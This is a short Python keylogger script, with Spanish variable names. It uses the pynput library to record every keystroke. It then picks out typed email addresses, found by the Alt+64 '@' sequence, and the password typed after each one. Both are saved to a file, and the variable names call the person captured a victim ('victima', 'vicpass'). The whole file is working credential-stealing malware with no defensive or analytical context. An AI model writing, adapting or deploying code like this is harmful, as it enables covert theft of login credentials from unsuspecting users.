import pynput
from pynput.keyboard import Key, Listener

global esperandoContraseña

if __name__ == "__main__":
    global esperandoContraseña
    esperandoContraseña = False

def on_press(key):
    write_file(key)

def write_file(keys):
    with open("log.txt","a") as log:
        k = str(keys).replace("'","")
        if k.find("space") > 0:                
            log.write('|<SEPARA>|')
        elif k.find("enter") > 0:
            log.write('|<SEPARA>|')
            log.write(k)
            log.write('|<SEPARA>|')
        elif k.find("alt_l") > 0:
            log.write('ALT')
        elif k.find("ctrl_l") > 0:
            log.write('|')  
        elif k.find("Key") == -1:
            log.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    if key == Key.enter:
        filtrar()

def filtrar():
    global esperandoContraseña
    
    with open('log.txt', 'r') as file: 
        if file.mode == 'r':
            contenido = file.read()
            if contenido.find("ALT64") > 0:
                cadenaInicial = contenido[:contenido.find("ALT64")]
                cadenaInvertida = cadenaInicial[::-1]
                correoInvertido = cadenaInvertida[:cadenaInvertida.find("|>ARAPES<|")]
                correo = correoInvertido[::-1]

                dominioInvertida = contenido[::-1]
                domInicial = dominioInvertida[:dominioInvertida.find("46TLA")]
                dominioInvertido = domInicial[::-1]
                dominio = dominioInvertido[:dominioInvertido.find("|<SEPARA>|")]
                
                victima = correo + '@' + dominio
                
                with open('send.txt', 'a') as hacks:
                    hacks.write(victima)
                    hacks.write('\n')
                    
                with open('log.txt', 'w') as file:
                    file.write("")

                esperandoContraseña = True
                
            elif esperandoContraseña == True:
                vicpass = contenido[:contenido.find("|<SEPARA>|")]
                
                with open('send.txt', 'a') as hacks:
                    hacks.write(vicpass)
                    hacks.write('\n \n')

                with open('log.txt', 'w') as file:
                    file.write("")

                esperandoContraseña = False


with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
